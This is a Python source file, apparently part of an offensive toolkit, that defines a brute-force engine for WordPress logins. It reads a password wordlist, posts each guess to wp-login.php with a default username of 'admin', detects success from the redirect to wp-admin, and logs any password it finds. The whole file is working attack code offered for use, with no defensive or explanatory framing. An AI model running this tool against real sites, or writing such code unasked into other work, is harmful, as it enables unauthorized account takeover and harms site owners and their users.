import requests
import time
from core.logger import log_event

class BruteEngine:
    def __init__(self, target, login_path="/wp-login.php"):
        self.target = target
        self.login_url = f"https://{target}{login_path}"
        self.wordlist = []

    def load_wordlist(self, filepath):
        with open(filepath, 'r') as f:
            self.wordlist = [line.strip() for line in f if line.strip()]
        log_event("brute", {"action": "wordlist_loaded", "count": len(self.wordlist)})

    def attempt_login(self, username, password):
        try:
            resp = requests.post(self.login_url, data={
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'https://{self.target}/wp-admin/',
                'testcookie': '1'
            }, timeout=5, allow_redirects=False)

            if resp.status_code == 302 and 'wp-admin' in resp.headers.get('Location', ''):
                log_event("brute", {"action": "login_success", "username": username, "password": password})
                return True
            return False
        except Exception as e:
            log_event("brute", {"action": "login_attempt_failed", "error": str(e)}, level="error")
            return False

    def start(self, username="admin", max_attempts=100):
        log_event("brute", {"action": "start", "target": self.target, "username": username})
        for i, password in enumerate(self.wordlist[:max_attempts]):
            print(f"Trying {username}:{password}")
            if self.attempt_login(username, password):
                print(f"Success! Password found: {password}")
                return password
            time.sleep(0.5)
        print("Brute force failed: No password found")
        return None


if __name__ == "__main__":
    brute = BruteEngine("example.com")
    brute.load_wordlist("data/wordlists/passwords.txt")
    brute.start()
